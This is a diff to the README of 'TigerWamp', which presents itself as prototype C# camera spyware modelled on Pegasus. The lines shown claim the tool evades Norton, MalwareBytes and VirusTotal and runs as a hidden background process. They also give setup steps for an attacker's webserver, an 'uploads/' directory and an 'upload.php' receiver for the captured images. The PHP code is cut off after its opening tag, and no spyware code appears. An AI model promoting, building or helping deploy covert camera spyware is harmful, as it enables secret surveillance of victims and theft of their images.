@@ -4,7 +4,7 @@ TigerWamp is a prototype camera spyware written in c# inspired by Pegasus!
 At the time of publication, it could bypass Norton, MalwareBytes, and VirusTotal.
 It runs as an invisible WPF application that hides in the middle of the background processes list.
 
-To use it you need your own webserver directory "uploads/" and a php file "upload.php" with contents:
+To use it you need your own webserver with directory "uploads/" and a php file "upload.php" with contents:
 
 ```php
 <?php
